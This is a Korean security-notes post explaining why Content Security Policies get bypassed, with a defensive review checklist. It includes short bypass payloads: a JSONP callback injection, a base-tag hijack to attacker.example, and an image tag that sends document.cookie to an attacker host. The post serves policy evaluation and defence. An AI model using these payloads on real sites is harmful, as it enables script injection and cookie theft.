---
title: "CSP 우회 패턴 (CSP Bypass)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, CSP]
tags: [csp, xss, nonce, strict-dynamic, web]
description: "정책이 있어도 신뢰 출처·신뢰 코드·누락 디렉티브로 CSP가 뚫리는 구조와, 허용 CDN·JSONP·base-uri·strict-dynamic 우회 구문을 정리합니다."
mermaid: true
---

> 기본 개념은 [CSP](/notes/content-security-policy/)에서 다뤘다. 이 글은 **"왜 그 정책이 뚫리는가"** 를 구조로 풀어, 정책을 읽고 평가하는 기준을 만든다.

## 개념

CSP는 스크립트의 **내용이 안전한지**를 판단하지 못한다. 판단 기준은 출처(origin), nonce, 해시뿐이다. 그래서 평가의 질문은 "정책이 있는가"가 아니라 **"정책이 신뢰하는 것 중 공격자가 조종할 수 있는 것이 있는가"** 다.

우회는 네 갈래로 생긴다.

- **허용 출처 악용** — `'self'`·CDN은 "그 호스트가 내놓는 것은 전부 안전"이라는 가정이다.
- **신뢰 코드 악용** — nonce 붙은 정상 스크립트가 데이터를 코드로 바꾸면(eval·동적 script), 공격자는 데이터만 넣는다.
- **누락 디렉티브** — `base-uri`·`object-src`·`form-action` 빈틈.
- **헤더 부재** — 오류·정적 응답에 헤더 누락.

## 공격·우회 구문

XSS 주입 지점과 결합해, 영향은 무해한 증거로만 보인다.

### 허용 출처 안의 통로

```
같은 출처 업로드 JS 가 script MIME 으로 서빙:  <script src="/uploads/me.js">
허용 CDN 의 JSONP:  <script src="https://cdn.allow.com/api?callback=alert(1)">
허용 CDN 전체 허용 → 그 안의 AngularJS 등으로 템플릿 실행
```

### base-uri 미지정 (nonce 사이트)

상대경로 스크립트가 있으면 로드 출처를 바꾼다.

```html
<base href="https://attacker.example/">
<!-- nonce 붙은 <script src="/js/app.js"> 가 attacker.example 에서 로드 -->
```

### 신뢰 코드에 데이터 주입 (strict-dynamic에서도 남음)

```
정상 스크립트가 location.hash / DOM 속성을 eval·innerHTML·동적 script 로 넘기면
→ 공격자는 스크립트가 아니라 '데이터'만 넣어 실행 (CSP 구조적으로 못 막음, Trusted Types로 보완)
```

### 비스크립트 유출

```
script 가 막혀도 느슨한 img-src/form-action/connect-src 로 데이터 전송
<img src="//attacker.example/?c=document.cookie">
```

### 확인 요령

```
오류 페이지·리다이렉트·정적 응답까지 헤더 유무와 Report-Only 여부 확인
script-src 의 각 출처를 "여기서 공격자 통제 응답이 나오는가"로 질문
nonce 가 새로고침마다 바뀌는지·캐시에 고정 안 됐는지
```

## 참고 자료

- [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [W3C: Content Security Policy Level 3](https://www.w3.org/TR/CSP3/)
- [CWE-693: Protection Mechanism Failure](https://cwe.mitre.org/data/definitions/693.html)
